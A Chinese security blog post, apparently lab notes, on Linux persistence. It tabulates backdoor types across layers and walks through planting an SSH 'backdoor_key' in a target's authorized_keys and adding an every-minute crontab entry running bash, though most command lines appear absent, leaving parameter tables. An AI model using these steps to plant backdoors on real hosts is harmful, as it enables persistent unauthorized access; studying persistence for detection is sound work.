权限维持

发表于 2026-10-21 分类于 Web安全 ， 漏洞笔记
本文记录权限维持基础原理以及防护的实验步骤。

权限维持的定义

权限维持的三个核心价值：

访问维持与特权保留的区分

类型 核心目标 典型技术
访问维持 失去连接后能够重新连回 SSH公钥、Cron任务、Shell配置、Systemd服务
特权保留 重连后快速从普通用户提升至 root SUID程序、Capabilities、UID=0 账户

Linux权限模型

文件权限的强制性检查

Linux系统攻击面

层次 组件 后门形式 实现难度 检测难度
固件层 BIOS/UEFI 固件级Rootkit 极高 极高
引导层 GRUB/Bootloader 引导程序篡改 高 高
内核层 Linux Kernel 内核模块Rootkit 极高 极高
服务层 Systemd/Init 恶意服务单元 中等 中等
用户层 Cron/Shell/SSH 定时任务、配置文件后门 低 低

后门技术分级

级别 典型技术 权限要求 隐蔽性 清除难度
用户级 SSH密钥、Cron 任务、Shell配置 普通用户 低 低
系统级 Systemd服务、SUID程序、PAM 模块 Root 中 中
内核级 LKM Rootkit、eBPF后门 Root 高 高

访问维持方法：

一、SSH公钥植入

步骤一：生成密钥对（Kali）

ssh-keygen参数说明

参数 说明
-t rsa 指定密钥算法为 RSA
-b 4096 密钥长度 4096 位，高于默认 2048，更安全
-f ~/.ssh/backdoor_key 私钥输出路径，公钥自动命名为 backdoor_key.pub
-N "" 私钥密码短语为空，便于自动化使用

cat参数说明

参数 说明
~/.ssh/backdoor_key.pub 读取公钥文件内容并输出到终端

步骤二：植入公钥（WebSrv）

mkdir参数说明

参数 说明
-p 递归创建目录，若已存在不报错
~/.ssh 用户家目录下的 .ssh 目录

chmod参数说明

参数 说明
700 属主可读写执行，组和其他用户无权限
600 属主可读写，组和其他用户无权限
~/.ssh 目标目录
~/.ssh/authorized_keys 目标文件

echo参数说明

参数 说明
"ssh-rsa AAAAB3Nz... kali@kali" 要写入的公钥内容

ssh参数说明

参数 说明
-i ~/.ssh/backdoor_key 指定私钥文件路径

常见问题

问题 原因 解决
仍要求密码 .ssh 权限不是 700 chmod 700 ~/.ssh
仍要求密码 authorized_keys 权限不是 600 chmod 600 ~/.ssh/authorized_keys
仍要求密码 公钥粘贴被换行截断 确认公钥为单行完整字符串
仍要求密码 sshd 禁用了公钥认证 检查 /etc/ssh/sshd_config

二、Cron定时任务

Cron 环境与交互式 Shell 的差异：

项 交互式 Shell Cron 环境
PATH 包含多个路径 仅 /usr/bin:/bin
环境变量 HOME、USER、LANG 等 极简
TTY 有 无

步骤一：植入定时任务（WebSrv）

crontab参数说明

参数 说明
-l 列出当前用户的 cron 任务
- 从标准输入读取内容并替换当前 crontab
2>/dev/null 屏蔽错误输出（无任务时不报错）

echo参数说明

参数 说明
'* * * * * /bin/bash -c "..."' 要写入的 cron 表达式与命令

cron表达式字段说明

字段 含义 取值
第 1 位 分钟 * 表示每分钟
第 2 位 小时 * 表示每小时
第 3 位 日 * 表示每天
第 4 位 月 * 表示每月
第 5 位 星期 * 表示每周
